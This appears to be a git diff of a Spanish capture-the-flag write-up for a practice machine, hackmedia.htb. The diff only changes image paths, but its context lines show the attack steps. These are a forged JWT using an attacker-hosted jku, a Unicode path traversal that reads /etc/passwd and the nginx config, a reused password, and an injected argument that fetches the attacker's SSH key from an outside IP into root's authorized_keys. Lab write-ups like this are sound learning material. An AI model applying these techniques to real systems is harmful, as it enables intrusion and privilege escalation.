@@ -1,4 +1,4 @@
-![](2022-07-02-09-58-31.png)
+![](assets/2022-07-02-09-58-31.png)
 
 * #Author: José Luis Íñigo
 * #Nickname: Riskoo
@@ -108,8 +108,8 @@ Vamos a navegar con el historial limpio . Hay que recordar que el jwt editor est
 
 ```
    2. Arrastra una cookie con jwt
-   ![](2022-07-02-10-18-00.png)
-   ![](2022-07-02-10-18-31.png)
+   ![](assets/2022-07-02-10-18-00.png)
+   ![](assets/2022-07-02-10-18-31.png)
    
    3. Aunque los links aparte de los mencionados no llevan a nada , he encontrado que la web se llama  Hackmedia y que luego tiene un enlace a twitter y bootstrap... en principio no es interesante pero si nos bloqueamos a lo mejor mdo o hackmedia podemos intentar usarlo como vhost
  
@@ -122,7 +122,7 @@ Vamos a navegar con el historial limpio . Hay que recordar que el jwt editor est
 
 ## Analizamos el jwt
 
-![](2022-07-02-10-21-38.png)
+![](assets/2022-07-02-10-21-38.png)
 
 Es interesante porque usa el jku en jwks.json
 
@@ -164,7 +164,7 @@ Podemos usar tres opciones:
    -mkjwk.org > En esta una vez sabemos el jwks pondremos los valores y nos creará una clave pública y una privada.
    en jwt.io pondremos esa clave publica y privada, modificaremos la url de donde acepta y modificamos en nuestro servidor el valor de jwks.json por el que nos da el programa. Con esto tendremos un jwks válido para nuestras claves. Y podremos modificar el valor nombre, role etc.
 
-![](2022-07-02-12-25-54.png)
+![](assets/2022-07-02-12-25-54.png)
 
 Ahora nos genera una clave privada y una pública x.509
 
@@ -209,7 +209,7 @@ t5ykYCSF6x5ekgVg9vMJKw==
 
 Vamos jwt.io según el paso de antes ya tenemos el jwt puesto y podemos ver la distribución
 
-![](2022-07-02-12-54-03.png)
+![](assets/2022-07-02-12-54-03.png)
 
 Hemos modificado el jku
 y el user que le hemos puesto admin (totalmente random, podría ser administrator u otro)
@@ -223,7 +223,7 @@ eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRidy9zdGF0
 
 wget hackmedia.htb/static/jwks.json
 
-![](2022-07-02-12-42-33.png)
+![](assets/2022-07-02-12-42-33.png)
 
 Cambiamos el valor de n por el de la página mkjwk.org y montamos un servidor con python3 -m http.server 80
 
@@ -239,7 +239,7 @@ Progamos directamente un traversal path. El típico es /etc/passwd . Podría lim
 http://hackmedia.htb/display/?page=‥/‥/‥/‥/‥/‥/‥/etc/passwd
 
 
-![](2022-07-02-20-05-42.png)
+![](assets/2022-07-02-20-05-42.png)
 
 Vimos anteriormente que era un ngix. Ahora que podemos leer podemos ir directamente a los archivos interesantes. Según google en ngix
 
@@ -247,11 +247,11 @@ By default on Debian systems, Nginx server blocks configuration files are stored
 
 http://hackmedia.htb/display/?page=‥/‥/‥/‥/‥/‥/‥/etc/nginx/sites-enabled/default
 
-![](2022-07-02-20-08-34.png)
+![](assets/2022-07-02-20-08-34.png)
 
 Vemos que en db.yaml hay una password
 
-![](2022-07-03-11-03-49.png)
+![](assets/2022-07-03-11-03-49.png)
 
 ```bash
 #Aparece un location así que probamos con las diferentes 
@@ -268,7 +268,7 @@ mysql_db: "user"
 ```
 Probamos con ssh
 
-![](2022-07-03-11-22-32.png)
+![](assets/2022-07-03-11-22-32.png)
 
 ```bash
 cat user.txt
@@ -288,7 +288,7 @@ User code may run the following commands on code:
 ```
 
 Ejecutamos como sudo el treport
-![](2022-07-03-11-32-33.png)
+![](assets/2022-07-03-11-32-33.png)
 
 Intentamos trastear , hay una opción de download pero bueno sin el código poco vamos a hacer después de hacer varias pruebas.
 
@@ -373,7 +373,7 @@ Probamos con pycdc https://github.com/zrax/pycdc
 
 Nos lo clonamos y hacemos un cmake Cmakelist.txt y luego make para compilarlo y que nos aparezca el ejecutable  
 
-![](2022-07-03-12-36-47.png)
+![](assets/2022-07-03-12-36-47.png)
 
 Ya tenemos el pycdc y ahora lo ejecutamos 
 
@@ -463,4 +463,4 @@ ssh-keygen desde /home/code y nos crea una id_rsa
 
 {10.10.11.126:1111/id_rsa.pub,-o,/root/.ssh/authorized_keys}
 
-![](2022-07-03-13-21-09.png)
+![](assets/2022-07-03-13-21-09.png)
